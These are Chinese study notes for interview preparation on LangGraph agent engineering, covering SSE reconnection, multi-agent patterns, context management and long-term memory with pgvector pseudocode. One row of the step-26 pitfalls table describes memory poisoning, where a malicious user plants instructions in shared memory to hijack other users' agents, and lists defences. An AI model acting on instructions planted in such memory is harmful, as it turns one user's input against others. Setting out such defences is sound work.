（grep 确认：SSE 断线重连 / Last-Event-ID 是通用 web 规范，LangGraph 官方文档不管这层，只管 checkpointer 状态恢复。两者配合：checkpointer 保 agent 状态、Last-Event-ID 保 token 序号）

#### 点 1 验证题

1. SSE 断了 EventSource 会怎样？跟 WebSocket 断了比，省在哪？
2. Last-Event-ID 是干嘛的？
3. LangGraph 的 checkpointer 能保证 token 级断点续传吗？为什么（坑点，别答错）？

答完进点 2（多实例会话亲和）。

#### 点 1 验证题答案（复盘，面试口径）

**Q1：SSE 断了 EventSource 会怎样？vs WebSocket 省在哪？**
- 答：EventSource 自动重连（retry 字段调等待时间，不设用浏览器默认），不用写重试代码。vs WebSocket 省两点：SSE 单向基于 HTTP 穿透好、不用升级 ws 连接/写心跳；重连浏览器内置，WebSocket 得自己写。LLM 单向推 token 用 SSE 轻量（ChatGPT 也 SSE）。

**Q2：Last-Event-ID 是干嘛的？**
- 答：SSE 重连时浏览器自动带的请求头。后端发 event 带 id: 字段，浏览器记最后 id；重连带回 Last-Event-ID 头，后端从 id 之后续发，不丢不重。= 断点续传的 offset/cursor。

**Q3：checkpointer 能保证 token 级断点续传吗？为什么？（坑点）**
- 答：**不能**。checkpointer 存 graph state（super-step 边界快照），不存 token 流式进度。且官方机制节点中断 resume 从头重跑。所以断在 LLM 生成中间，重连后重新生成，之前 token 前端已有，LLM 非确定性会重复/错乱。
- 生产常见做法（🔴 推理，官方没明说）：断了重新生成前端清空重显；或靠 thread_id 从 checkpoint 续（断在节点边界能续，中间重跑）。严谨 token 级续传成本高不做。
- 口径：SSE 的 Last-Event-ID 在 LangGraph 流式里 token 级续传不是开箱即用，要自己处理。

> 第 23 步点 2/3/4（会话亲和、HITL 流式中断、反向代理缓冲）的完整生产伪代码在独立文档 `Agent工程流式SSE生产落地.md`，这里不重复。

---

### 第24步：Multi-Agent（体系化）

> ⚠️ **读这步前先看地基文档** [`Agent工程LangGraph心智模型.md`](./Agent工程LangGraph心智模型.md)：图引擎 + 5 元素（State/Node/Edge/Checkpointer/START-END）+ node 是函数不是 agent + Command/interrupt 两个维度（Command 管"走"，interrupt 管"停"，停完 `Command(resume=)` 接着走）。地基不懂，下面 5 模式看不懂。

第 22-23 步讲完流式，这步讲 multi-agent。先讲动机，再给官方 5 种模式体系，最后万物云口径。

#### 为什么要 multi-agent

单 agent（create_agent）能调工具、能 ReAct，为啥还要多个？
- **上下文杂**：一个 agent 既查订单又写 SQL 又生成报告，工具多、system prompt 臃肿，LLM 选错工具、上下文爆炸
- **职责分离**：每个 agent 专一，各自 prompt + 工具精简
- **独立优化/限流**：每个 agent 单独调 prompt、监控、限流

后端类比：单 agent = 单体应用；multi-agent = 微服务（按职责拆 service 互相调用）。

> 官方提醒（🟢 原文）："not every complex task requires this approach-a single agent with the right tools and prompt can often achieve similar results." 别为了 multi-agent 而 multi-agent。

#### 官方 5 种模式体系（🟢 docs.langchain.com/oss/python/langchain/multi-agent 核对）

**重大纠偏**：别再说老的 "Supervisor / Swarm / Team 三种模式"。官方文档已重组，multi-agent 现在在 **langchain 包下**（不在 langgraph），5 种模式：

| 模式 | 是啥 | 后端类比 |
|---|---|---|
| **Subagents** | 主 agent 把子 agent 包成 `@tool`，自己调度（=老 supervisor） | 门面 service 调多个子 service |
| **Handoffs** | tool 返回 `Command` 更新 state，触发切换 agent | 工作流节点跳转 |
| **Skills** | 单 agent 按需加载专门 prompt/知识 | 按需 import 模块 |
| **Router** | 路由步骤分类输入，导向专门 agent | API 网关路由 |
| **Custom workflow** | StateGraph 自定义执行流 | 自定义工作流引擎（Activiti） |

5 种模式详细伪代码 + 逐行解释在 `Agent工程MultiAgent模式.md`。

#### 关键纠偏（面试别说错）

- **Swarm 已从官方文档消失**，langgraph-supervisor/swarm 包不再维护
- **Supervisor = Subagents 别称**（不是独立模式，官方原文："a central main agent often referred to as a supervisor"）
- **没有 `handoff()` 函数**，手写 `@tool` + `Command`（配 `ToolMessage` 闭合 tool-call 循环）
- `create_react_agent` -> `create_agent`（v1 迁移）
- multi-agent 文档在 langchain 包下，底层仍用 LangGraph 的 Command/Send/StateGraph
- 官方推荐 built-in multi-agent 用 **Deep Agents**（更高层 harness，含 subagents/skills/planning/虚拟文件系统/上下文管理）

#### 性能对比（🟢 官方实测，面试硬货）

| 模式 | 单次 | 重复请求 | 多领域 |
|---|---|---|---|
| Subagents | 4 calls | 8 calls | 5 calls / 9K tokens |
| Handoffs | 3 calls | 5 calls | 7+ calls / 14K+ tokens |
| Skills | 3 calls | 5 calls | 3 calls / 15K tokens |
| Router | 3 calls | 6 calls | 5 calls / 9K tokens |

关键 insight：
- 重复请求 Handoffs/Skills 省 40-50%（subagent 无状态每次重跑全流程）
- 并行多领域 Subagents/Router 最优（Handoffs 必须串行最差）

#### 特性矩阵（🟢 官方，选模式用）

| 模式 | 分布式开发 | 并行 | 多跳串行 | 子agent直接面对用户 |
|---|---|---|---|---|
| Subagents | ✓✓✓ | ✓✓✓ | ✓✓✓ | ✗ |
| Handoffs | - | - | ✓✓✓ | ✓✓✓ |
| Skills | ✓✓✓ | ✓✓ | ✓✓✓ | ✓✓✓ |
| Router | ✓✓ | ✓✓✓ | - | ✓✓ |

**模式可混搭**（🟢 原文）："You can mix patterns! A subagents architecture can invoke tools that invoke custom workflows or router agents."

#### 选择策略（🟢 官方）

- 优化单次请求 -> Subagents/Handoffs/Skills
- 优化重复请求 -> Handoffs/Skills
- 并行执行 -> Subagents/Router
- 大上下文领域 -> Subagents/Router
- 简单聚焦任务 -> Router
- 确定性业务流程编排 -> Custom workflow（万物云用这个）
- **supervisor vs router**：supervisor 完整 agent 维护对话上下文动态决策；router 单次分类步骤无状态分发

#### 万物云口径（按真实 + 🔴 推断）

万物云用 StateGraph 自定义执行流（之前确认），对应官方 **Custom workflow** 模式。

⚠️ 🔴 推断：基于"万物云用 StateGraph"对应，源文档没明确把万物云 multi-agent 归类到 5 种哪一种。面试口径：
- "我们用 LangGraph StateGraph 自定义执行流（Custom workflow），按业务流程编排节点（普通函数/LLM 调用/agent），没直接用 Subagents/Handoffs 高层模式"
- 追问为什么不用 Subagents/Supervisor："业务流程是确定性编排（先查单->再分析->再生成报告），StateGraph 直接定义节点边比 Subagents 动态调度更可控"

具体按真实讲，Agent 核对源文档后若修正再更新。

#### 第24步检查题

1. 官方 multi-agent 5 种模式各是啥？别再说老的三种（纠偏）
2. Subagents 和 Router 区别？性能各自适合什么场景？
3. handoff 怎么实现？有 handoff() 函数吗？两种实现（单agent+middleware / 多subgraph）官方推荐哪个？
4. 万物云用哪种模式？面试怎么答？

答出来再走第25步。

> 5 种模式详细伪代码 + 逐行解释 + 后端类比 + 特性矩阵在 `Agent工程MultiAgent模式.md`。
>
> 📌 **体系全景**（4 层次：推理模式 / workflow 模式 / multi-agent 模式 / 框架 team + subagent 5 形式 + 业务场景 + 决策树）见 [`Agent工程MultiAgent体系全景.md`](./Agent工程MultiAgent体系全景.md)。看完 5 模式一定要看全景，才知道 ReAct / multi-agent / team 怎么分层次。

---

### 第25步：上下文工程（context engineering）

> Agent 工程生产化第一个硬核专题。Deep Agents 四层上下文管理 🟢 核实（全景 5.6），生产坑含滑动窗口/摘要/checkpointer 膨胀。

#### 为什么重要（先讲痛点）

LLM context window 有限（如 200K token）。Agent 运行中上下文会**不断膨胀**：
- 多轮对话消息累积
- 工具大输出（搜索结果/读文件/DB 查询，单次几十 KB）
- 子 agent 中间过程（如果不隔离）

不管理 -> 上下文超限报错 / 超时 / 成本飙升 / LLM 注意力分散质量下降。

后端类比（🟡）：像 Redis 内存有限要淘汰策略；或日志滚动；或线程上下文隔离。

#### Deep Agents 四层上下文管理（🟢 全景 5.6 核实）

| 层 | 是啥 | 机制 |
|---|---|---|
| 1. 输入上下文 | system prompt + 用户输入 + 历史 | 基础，所有 agent 都有 |
| 2. 压缩 | 摘要 / 卸载 | 摘要旧消息 / 大输出卸载到文件（write_file） |
| 3. 隔离 | 子代理隔离 | subagent 干活不污染主上下文，只回最终结果（见全景第 4 节 subagent） |
| 4. 长期记忆 | 跨会话 | AGENTS.md（Deep Agents）/ 外部 store（pgvector 等，见第 26 步） |

#### 生产坑与对策（4 个，每个带伪代码/对策）

**坑 1：多轮消息无限叠加**
- 痛点：对话越长 messages 越多，撑爆 context
- 对策：滑动窗口（只留最近 N 轮）+ 摘要（旧消息 LLM 摘成一段）
- 伪代码（🟡 通用思路）：
```python
def trim_messages(messages, max_recent=20):
    if len(messages) > max_recent:
        old = messages[:-max_recent]
        summary = llm.summarize(old)            # 旧消息摘要
        return [SystemMessage(f"之前对话摘要：{summary}")] + messages[-max_recent:]
    return messages
```
- 后端类比（🟡）：日志滚动（保留最近 N 条 + 旧日志归档摘要）

**坑 2：工具大输出污染上下文**
- 痛点：搜索返回 10KB、读文件 50KB，全塞主上下文
- 对策：subagent 隔离（subagent 内部处理大输出，只回最终结果）/ 卸载到文件（Deep Agents write_file，主上下文只留引用）
- 后端类比（🟡）：大查询结果别全加载内存，分页或落临时表

**坑 3：Checkpointer 存储膨胀**
- 痛点：每个 super-step 存一份 state 快照，长对话/多线程 -> DB 膨胀
- 对策：TTL 清理旧 checkpoint / 定期归档 / 限制 thread 数
- 万物云口径（🟢 之前确认）：长期记忆用 pgvector + similar merge + TTL
- 后端类比（🟡）：流程引擎 ACT_RU_EXECUTION 表也要定期清理已结束流程实例

**坑 4：上下文超限报错**
- 痛点：超 context window 直接报错
- 对策：截断（trim）/ 摘要 / 换大 context 模型 / 分拆任务给 subagent

#### 万物云口径（按真实，面试照实说）
- **长期记忆**：pgvector + similar merge + TTL（🟢 之前确认，**不是** Deep Agents 的 AGENTS.md）
- **上下文压缩**：滑动窗口/摘要是通用生产做法，万物云作为生产系统会用，具体策略未明确（🔴 不编）
- **没用** Deep Agents 的 AGENTS.md / 虚拟文件系统卸载
- **面试口径**："上下文管理我们用滑动窗口 + 摘要控制多轮消息，工具大输出靠 subagent 隔离。长期记忆用 pgvector 向量检索 + 相似合并 + TTL 清理。没用 Deep Agents 的 AGENTS.md，自己用 pgvector 实现。"

#### 第25步检查题
1. Agent 运行中上下文为什么会膨胀？不管理会怎样？
2. Deep Agents 四层上下文管理各是啥？哪层靠 subagent？
3. 多轮消息无限叠加怎么解决？工具大输出污染怎么解决？
4. Checkpointer 存储膨胀怎么解决？万物云长期记忆用什么（不是 AGENTS.md）？
5. subagent 隔离怎么解决上下文污染？（联系全景第 4 节）

---

### 第26步：长期记忆（long-term memory）
> 一句话定位：跨会话/跨 thread 持久化的记忆，由 LangGraph **Store**（namespace+key 的 JSON 文档，可挂向量检索）承载；与第5步心智模型里"短期=checkpointer/上下文窗口"严格区分。来源：LangGraph Persistence/Stores 官方文档 🟢、LangChain long-term-memory 官方页 🟢、Deep Agents memory 官方页 🟢。

#### 为什么重要（痛点先讲）

你已经在前 25 步里建立了心智模型：checkpointer 把**单个 thread 的 graph state**存成 checkpoint，靠 `thread_id` 续接对话、做 interrupt/time-travel。但生产里你会立刻撞上三个 checkpointer 解决不了的痛点：

1. **用户换了会话就失忆**。用户昨天在 thread-1 说"我偏好简洁回答"，今天开 thread-2，agent 又开始长篇大论。checkpointer 是 thread-scoped 的，`thread_id` 一换，checkpoint 完全隔离 🟢（Persistence 官方页原话："Checkpointer … Persists Graph state snapshots … Scope: A single thread"）。你需要的"用户偏好"是**跨 thread**的，checkpointer 给不了。

2. **多用户/多 agent 共享知识无处放**。运营给所有用户注入"公司合规政策"，难道每个 thread 都拷一份？这是"组织级"记忆，必须独立于任何 thread 存在 🟢（Deep Agents memory 页："Organization-level memory … organization-wide namespace"）。

3. **RAG 检索不等于记忆**。你可能想"那我直接用向量库召回历史不就行了？"——但纯向量召回没有**写入策略**（谁写、何时写、冲突怎么合并、过期怎么清），会很快退化成"记忆垃圾场"：重复记忆、矛盾记忆、过期记忆、被污染的记忆全混在一起。万物云之所以明确做"similar merge + TTL"，正是因为光有 pgvector 召回是不够的 🟢（用户确认）🔴（具体算法待核）。

长期记忆就是解决"**跨 thread、跨用户、跨会话**的持久化 + 可控写入 + 可控检索"这一层。

#### 概念（是啥）

先把三层"记忆"彻底分清，这是本步的地基：

| 层 | 载体 | 作用域 | 存什么 | 官方原话 |
|---|---|---|---|---|
| **上下文窗口** | LLM 的 input tokens | 单次 invoke | 当前 messages + system prompt | "Input context: System prompt, memory, skills…" 🟢 |
| **短期记忆（checkpointer）** | `InMemorySaver`/`PostgresSaver` | **单 thread** | 整个 graph state 的 snapshot（含 messages） | "Short-term, thread-scoped memory" 🟢 |
| **长期记忆（store）** | `InMemoryStore`/`PostgresStore` | **跨 thread** | 你自定义的 namespace+key JSON 文档 | "Long-term, cross-thread memory" 🟢 |

一句话：**checkpointer 存"对话本身"，store 存"从对话里提炼出的、要带去下次对话的东西"** 🟢。

长期记忆在官方体系里有**两种实现路径**，这是本步要讲透的核心对比：

- **路径 A：LangGraph Store API**（底层抽象）。你直接拿 `BaseStore`（`put/get/delete/search/list_namespaces`），把记忆存成 `(namespace, key, value_dict)` 的 JSON 文档，可挂 `index={embed, dims, fields}` 做向量语义检索 🟢。`create_agent(store=...)` 或 `builder.compile(store=...)` 注入，节点/工具里用 `runtime.store` 读写 🟢。**这是万物云走的路** 🟢。

- **路径 B：Deep Agents AGENTS.md**（文件式记忆，harness 层封装）。`create_deep_agent(memory=["/memories/AGENTS.md"])`，把记忆当成**虚拟文件系统里的文件**，启动时整份加载进 system prompt，agent 用 `edit_file` 工具自己改 🟢。底层还是走 Store（`StoreBackend` 把文件存进 store 的 namespace）🟢，但你操作的是"文件路径"而非 `put/get`。**万物云没用这条** 🟢。

两者关系：AGENTS.md 是"文件壳"，Store 是"存储芯"。路径 B 是路径 A 上面套了一层文件抽象 🟢（Deep Agents memory 页："memory files … content is stored in the configured backend (StateBackend, StoreBackend, or FilesystemBackend)"）。

#### 深入（机制/原理，带三色）

**1. Store 的数据模型：namespace + key + value**

官方原话："LangGraph stores long-term memories as JSON documents in a store. Each memory is organized under a custom namespace (similar to a folder) and a distinct key (like a file name)." 🟢

```
namespace = ("user-123", "memories")   # 元组，类似文件夹路径
key       = "mem-001"                  # namespace 内唯一
value     = {"text": "用户喜欢简洁", "category": "preference"}  # dict
```

`Item` 对象有 5 个字段 🟢：`value`(dict)、`key`(str)、`namespace`(tuple)、`created_at`、`updated_at`。`namespace` 是 tuple 但序列化成 JSON 时变 list 🟢。

**namespace 的前缀匹配**是关键机制：`search(("user-123",))` 会返回 `("user-123",)`、`("user-123","memories")`、`("user-123","preferences")` 下所有 item 🟢。这就是"按用户/按组织"隔离 + 跨层级检索的基础。

官方给的 SQL schema（PostgresStore 这类后端的典型实现）🟢：
```sql
CREATE TABLE store_items (
  namespace   TEXT[] NOT NULL,
  key         TEXT NOT NULL,
  value       JSONB NOT NULL,
  created_at  TIMESTAMPTZ DEFAULT now(),
  updated_at  TIMESTAMPTZ DEFAULT now(),
  PRIMARY KEY (namespace, key)
);
CREATE INDEX ON store_items USING gin(namespace);
```

**2. BaseStore 契约（5 个 async 方法必实现，sync 可选）** 🟢

| 方法 | 作用 |
|---|---|
| `aput(namespace, key, value, index=None)` | 存/覆盖单条；`index` 控制是否建向量索引 |
| `aget(namespace, key)` | 精确取一条，没有返回 None |
| `adelete(namespace, key)` | 删一条 |
| `asearch(namespace_prefix, *, query=None, filter=None, limit=10, offset=0)` | 前缀检索；`query` 走语义、`filter` 走等值、可分页 |
| `alist_namespaces(*, prefix=None, suffix=None, max_depth=None, limit=100, offset=0)` | 列出 namespace |

**3. 语义检索（向量召回）的开启方式**

给 store 传 `index` 配置 🟢：
```python
store = InMemoryStore(index={
    "embed": init_embeddings("openai:text-embedding-3-small"),  # embedding 提供者
    "dims": 1536,                                                # 维度
    "fields": ["$"]                                              # "$" = 整个 value 都 embed
})
```
之后 `store.search(ns, query="用户喜欢什么", limit=3)` 就会：把 query embed → 在该 namespace 下算 cosine 相似度 → 按相似度排序返回 top-K，每条带 `score` 字段 🟢。

`put` 时还能精细控制 🟢：
- `index=["food_preference"]` —— 只 embed 某个字段
- `index=False` —— 存但不 embed（仍能 `aget`/`filter` 取，但不能 `query` 语义搜）

**官方只说"rank by cosine similarity"，没在 fetched 页里点名 pgvector** 🔴。但 PostgresStore 要在 Postgres 上做向量 cosine 检索，工业上唯一标准实现就是 pgvector 扩展 🟡（通用后端常识）。万物云口径"用 pgvector"🟢 与此吻合。

**4. 排序陷阱**（生产必踩）🟢：
- `PostgresStore` / `AsyncPostgresStore`：默认按 `updated_at` **降序**（最新更新的在前）
- `InMemoryStore`：按**插入顺序**（最新插入的在最后）
- 官方警告："Do not rely on a specific order across implementations; sort client-side on item.updated_at if order matters." —— **生产里必须在应用层按 `updated_at` 自己排**，别信默认顺序。

**5. AGENTS.md 路径的机制**（对比用，万物云没走 🟢）

Deep Agents 把记忆当文件 🟢：
- `memory=["/memories/AGENTS.md"]` 声明记忆文件路径
- 启动时整份读进 system prompt（"always loaded"，区别于 skills 的 on-demand）🟢
- agent 用内置 `edit_file` 工具自己改记忆文件 🟢
- `StoreBackend(namespace=lambda rt: (rt.server_info.user.identity,))` 决定这份"文件"实际存到 store 的哪个 namespace —— **user-scoped / agent-scoped / org-scoped 全靠 namespace 函数控制** 🟢
- 并发写是 **last-write-wins**，官方建议用 background consolidation 串行化，或拆成多个 topic 文件减少争用 🟢

**6. 后台整理（background consolidation / sleep-time compute）** 🟢

官方推荐的生产记忆写入策略之一：不在对话中写（hot path），而是另一个 deep agent 在对话间隔跑，回顾近期对话、提炼事实、merge 进记忆库，靠 cron 触发。**核心约束：cron 间隔必须 = 回顾窗口**，否则重复处理或漏记忆 🟢。万物云的"similar merge + TTL"与此同源 🟢（用户确认有）🔴（具体是不是用 consolidation agent 模式实现的待核）。

#### 生产实战（伪代码 + 逐行解释，每行注释）

下面给万物云式自建路径（StateGraph + create_agent + pgvector store + similar merge + TTL）的完整伪代码。这是**路径 A**，不是 AGENTS.md。

```python
# ===== 1. 建 pgvector store（生产用 PostgresStore + 向量索引）=====
from langgraph.store.postgres import PostgresStore            # 官方生产后端 🟢
from langgraph.store.base import IndexConfig                  # 索引配置类型 🟢
from langchain.embeddings import init_embeddings              # embedding 工厂 🟢

DB_URI = "postgresql://app:***@pg:5432/agent?sslmode=require" # 生产连接串

def make_store():
    # PostgresStore.from_conn_string 内部会用 pgvector 扩展存向量 🔴(官方页未点名 pgvector,但这是 Postgres 向量检索的唯一标准实现 🟡)
    with PostgresStore.from_conn_string(
        DB_URI,
        index=IndexConfig(
            embed=init_embeddings("openai:text-embedding-3-small"),  # embed 函数 🟢
            dims=1536,                                                # 必须和 embed 模型维度一致 🟢
            fields=["$"],                                             # 整个 value 都 embed 🟢
        ),
    ) as store:
        store.setup()   # 建表 + 建 GIN/向量索引,幂等 🟢
        return store

store = make_store()
```

```python
# ===== 2. 写记忆:带 similar merge(语义去重合并)=====
import uuid
from datetime import datetime, timezone

SIM_THRESHOLD = 0.92   # 相似度阈值,>=此值视为"同一条记忆"需合并 🔴(阈值是业务调参,官方无默认)

def write_memory(runtime, user_id: str, text: str, category: str):
    """
    写一条记忆。先语义搜同 namespace 下是否有高度相似的:
    - 有 -> 合并(update那条,把新事实并进去)
    - 无 -> 新建
    这是万物云"similar merge"的核心 🔴(万物云确认有 similar merge 🟢,具体合并算法待核)
    """
    ns = (user_id, "memories")                       # user-scoped namespace 🟢
    # 2.1 语义检索:query=text,看有没有重复
    hits = runtime.store.search(
        ns,
        query=text,          # 走向量 cosine 召回 🟢
        filter={"category": category},  # 等值过滤,先按类别收窄 🟢
        limit=5,
    )
    # 2.2 按 score 找最相似的(score 越高越相似 🟢)
    best = max(hits, key=lambda it: getattr(it, "score", 0.0)) if hits else None
    if best and getattr(best, "score", 0.0) >= SIM_THRESHOLD:
        # 2.3 合并:把新 text 追加到原 value,更新 updated_at
        merged_text = best.value["text"] + "\n---\n" + text   # 简化:实际可让 LLM 做语义合并 🔴
        runtime.store.put(
            ns,
            best.key,                 # 用原 key -> 覆盖同一条 🟢(aput 是 store or overwrite)
            {
                "text": merged_text,
                "category": category,
                "updated_at": datetime.now(timezone.utc).isoformat(),
                "ttl_days": 30,       # 自定义 TTL 字段(官方 store 无内置 TTL 🔴)
            },
            index=["text"],           # 只 embed text 字段 🟢
        )
        return "merged"
    else:
        # 2.4 新建
        runtime.store.put(
            ns,
            str(uuid.uuid4()),        # 新 key 🟢
            {
                "text": text,
                "category": category,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "updated_at": datetime.now(timezone.utc).isoformat(),
                "ttl_days": 30,
            },
            index=["text"],
        )
        return "created"
```

```python
# ===== 3. 读记忆:进入对话前把相关记忆塞进 system prompt =====
def recall_memory(runtime, user_id: str, current_query: str, top_k: int = 5):
    """
    用当前用户消息做 query,语义召回 top-K 相关记忆,拼进 system prompt。
    官方模式:node 里用 runtime.store.asearch 🟢
    """
    ns = (user_id, "memories")
    items = runtime.store.search(
        ns,
        query=current_query,          # 语义召回 🟢
        limit=top_k,
    )
    # 官方警告:别信默认排序,自己按 updated_at 排 🟢
    items = sorted(items, key=lambda it: it.value.get("updated_at",""), reverse=True)
    # 拼成 system prompt 片段
    memories_text = "\n".join(
        f"- [{it.value.get('category','?')}] {it.value['text']}" for it in items
    )
    return f"## 已知用户记忆\n{memories_text}" if memories_text else ""
```

```python
# ===== 4. TTL 清理:定时删过期记忆(官方 store 无内置 TTL,自己跑 cron)=====
# 官方对 checkpointer 说"set a retention policy / cron job delete old" 🟢
# store 同理:靠 created_at/updated_at + 自定义 ttl_days 字段 🔴
def cleanup_expired(store):
    from datetime import datetime, timezone, timedelta
    now = datetime.now(timezone.utc)
    # 4.1 列出所有 user namespace(前缀匹配所有用户 🟢)
    namespaces = store.list_namespaces(prefix=(), max_depth=2)  # ("user-xxx","memories")
    for ns in namespaces:
        if "memories" not in ns:
            continue
        # 4.2 该 namespace 下全量翻页 🟢(search 无 query=列举)
        offset = 0
        while True:
            page = store.search(ns, limit=100, offset=offset)   # 翻页 🟢
            if not page:
                break
            for it in page:
                ttl = it.value.get("ttl_days", 30)
                updated = datetime.fromisoformat(it.value["updated_at"])
                if now - updated > timedelta(days=ttl):
                    store.delete(ns, it.key)        # 过期就删 🟢
            offset += 100
```

```python
# ===== 5. 接进 create_agent / StateGraph =====
from langchain.agents import create_agent
from langchain.tools import ToolRuntime, tool
from dataclasses import dataclass

@dataclass
class Ctx:
    user_id: str

@tool
def save_preference(preference: str, runtime: ToolRuntime[Ctx]) -> str:
    """把用户偏好存进长期记忆。"""
    return write_memory(runtime, runtime.context.user_id, preference, "preference")

agent = create_agent(
    model="anthropic:claude-sonnet-4-6",
    tools=[save_preference],
    store=store,                  # 注入 store,工具里 runtime.store 就能拿到 🟢
    context_schema=Ctx,
)

# 调用时带 user_id(决定记忆隔离边界)
agent.invoke(
    {"messages": [{"role":"user","content":"我以后回答都用中文,简洁点"}]},
    context=Ctx(user_id="user-123"),
)
```

关键点逐条：
- `runtime.store` 是同一个 store 实例（注入到 `create_agent`/`compile` 的那个）🟢
- `search` 的 `filter` 是等值过滤、`query` 是语义召回，**两者可叠加** 🟢
- `put` 同 key = 覆盖（这就是 similar merge 里"更新原条目"的机制）🟢
- TTL 没有内置，**必须自己跑 cron**，官方只对 checkpointer 明说"retention policy"，store 同理推断 🔴

#### 生产注意（坑 + 对策）

| 坑 | 现象 | 对策 | 来源 |
|---|---|---|---|
| **记忆污染（prompt injection）** | 恶意用户往共享/组织级记忆写指令，毒化所有用户的 agent | org/agent-scoped 记忆设**只读**（用 permissions 拒写）；user-scoped 默认隔离；写共享记忆前加 interrupt 人工审核 | 🟢 Deep Agents memory 页"Security considerations" |
| **并发写 last-write-wins** | 同一记忆文件被多 thread 并发改，后写覆盖前写 | user-scoped 罕见（用户通常单会话）；agent/org-scoped 用 background consolidation 串行化，或拆成 per-topic 多文件 | 🟢 Deep Agents memory 页"Concurrent writes" |
| **默认排序不稳** | InMemoryStore 插入序、PostgresStore updated_at 降序，跨后端不一致 | **永远在应用层按 `updated_at` 排序**，别依赖 store 默认序 | 🟢 Stores 页"Default ordering depends on the store backend" |
| **limit 静默截断** | 超过 limit 的结果被丢，**没有 overflow 信号** | limit 设大于预期上限，或用 offset 分页；分页时检查返回是否为空 | 🟢 Stores 页"Results past limit are silently truncated" |
| **namespace 前缀误召回** | `search(("alice",))` 把 `("alice","memories")` 和 `("alice","secrets")` 全召回 | 要单层就传完整 namespace，或在应用层按 `item.namespace` 过滤 | 🟢 Stores 页"namespace_prefix matches by prefix, not exactly" |
| **召回率低/噪声大** | 向量召回 top-K 里一堆不相关 | 调 `SIM_THRESHOLD`；按 `filter` 先收窄类别再语义搜；embedding 模型选小而精的 | 🔴 业务调参 |
| **记忆膨胀** | 长期跑下来记忆库越来越大，检索变慢 + token 爆 | similar merge 去重 + TTL 定期清 + background consolidation 压缩 | 🟢(consolidation) 🔴(TTL 自实现) |
| **隐私泄露** | A 用户的记忆漏到 B 用户 | namespace 必须**强制带 user_id**，且 user_id 从 `runtime.context`/`server_info.user.identity` 取，**绝不从用户消息里取** | 🟢 Deep Agents user-scoped 模式 |
| **AGENTS.md 整份加载爆 token** | memory 文件越来越大，每次启动都全量进 system prompt | 控制文件大小；或改走路径 A（Store）按需召回；或用 background consolidation 保持文件精简 | 🟢 Deep Agents "always loaded" |
| **checkpoint 与 store 混用混乱** | 把短期对话历史塞进 store，或把长期偏好塞进 checkpoint | 严格按表分：对话历史→checkpointer，提炼事实→store | 🟢 Persistence 页对照表 |

#### 后端类比（Agent 概念 | 后端类比 | 说明）

| Agent 长期记忆概念 | 后端类比（Spring/Activiti/Redis/JUC） | 说明 |
|---|---|---|
| **checkpointer（短期）** | Activiti 的 `RuntimeService` 流程实例变量 + Redis session（按 sessionId） | 只在本次流程/会话内有效，换 thread = 换 sessionId，隔离 |
| **store（长期）** | MySQL `user_profile` 表 / Redis hash（key=user_id） | 跨 session 存在，用户下次登录还在 |
| **namespace 元组** | Redis key 前缀 `user:123:memories:*` / MySQL 分区键 | 层级隔离 + 前缀模糊检索 |
| **namespace 前缀匹配** | Redis `SCAN user:123:*` / MySQL `WHERE namespace LIKE 'user:123,%'` | 跨子命名空间召回 |
| **Item 的 key** | Redis hash 的 field / MySQL 主键 id | namespace 内唯一 |
| **Item 的 value(JSONB)** | MySQL JSON 列 / Redis hash 的 value(JSON 串) | 结构化但灵活 |
| **`created_at`/`updated_at`** | MySQL 审计字段 / Activiti 历史变量时间戳 | TTL 排序、冲突检测都靠它 |
| **语义检索（query + cosine）** | Elasticsearch dense_vector + cosine / pgvector | 按意思而非精确匹配召回 |
| **`index={embed,dims,fields}`** | ES 的 vector mapping + index_options | 决定哪些字段建向量索引 |
| **similar merge** | MySQL `INSERT ... ON DUPLICATE KEY UPDATE` + 版本合并 / Activiti 流程变量 merge | 相似就合并、不似就新建 |
| **TTL 清理 cron** | Redis `EXPIRE` / MySQL Event Scheduler 定时删 / Spring `@Scheduled` | 官方 store 无内置 TTL，等价于自己跑定时任务 |
| **background consolidation** | Spring Batch 定时 ETL 任务 / Activiti 定时服务任务 | 离线整理，避免 hot path 延迟 |
| **user-scoped namespace** | `@PreAuthorize` + `principal.id` 隔离 / MyBatis 拦截器加 user_id 条件 | 强制按用户隔离，防越权 |
| **read-only 记忆（防注入）** | Spring 只读 Repository / DB 用户只授 SELECT 权限 | 共享数据只读，写只能走应用代码 |
| **last-write-wins** | JUC `ConcurrentHashMap` 无锁 put / MySQL 无版本号的 UPDATE | 并发写冲突的默认语义，需乐观锁才能避免 |
| **AGENTS.md（文件式记忆）** | Spring `application.yml` / `@ConfigurationProperties` | 启动时整份加载进"上下文"（system prompt），改了要重启或热刷 |
| **runtime.store 注入** | Spring `@Autowired BaseStore` / Activiti `DelegateExecution.getVariable` | 框架自动注入，节点/工具里直接用 |

#### 万物云口径（按真实，三色标注，没明确说的标🔴不编）

| 维度 | 万物云口径 | 来源 |
|---|---|---|
| **长期记忆实现** | pgvector + similar merge + TTL | 🟢 用户确认 |
| **底层框架** | StateGraph + create_agent（**不是 Deep Agents**，不用 `create_deep_agent`） | 🟢 用户确认 |
| **记忆抽象** | 走 LangGraph Store API（路径 A），**不用 AGENTS.md / SKILL.md / 虚拟文件系统** | 🟢 用户确认 |
| **存储后端** | pgvector（Postgres 向量扩展）—— 官方 PostgresStore 支持向量检索，底层即 pgvector | 🟢(万物云用 pgvector) + 🟡(PostgresStore 用 pgvector 是后端常识，官方 fetched 页未点名) |
| **similar merge** | 有此机制（语义相似则合并、否则新建） | 🟢 用户确认 / 🔴 具体合并算法、相似度阈值待核 |
| **TTL** | 有此机制（记忆过期清理） | 🟢 用户确认 / 🔴 官方 store 无内置 TTL，万物云具体实现（cron 字段/清理周期）待核 |
| **不用 RedisStore** | 明确不用 RedisStore 做长期记忆 | 🟢 用户确认 |
| **不用 Deep Agents AGENTS.md** | 明确不用 | 🟢 用户确认 |
| **RAGAS/Langfuse/LangSmith** | 只"了解"没用 | 🟢 用户确认 |
| **记忆隔离** | 按 user_id namespace 隔离 🔴（推断，基于路径 A 的标准模式，万物云没明确说） | 🔴 待核 |
| **background consolidation** | 是否用了"后台整理 agent"模式未明确 | 🔴 待核，不编 |
| **并发写保护** | 万物云自托管加自己 Redis 锁（这是 concurrent-run 的 hard protection，非记忆专属） | 🔴 待核 |

**核心口径一句话**：万物云长期记忆 = LangGraph Store（PostgresStore/pgvector）+ 自己实现的 similar merge + 自己实现的 TTL cron，跑在 StateGraph+create_agent 自建框架上，没用 Deep Agents 的 AGENTS.md 文件式记忆 🟢。

#### 第26步检查题（5道，含预判疑问）

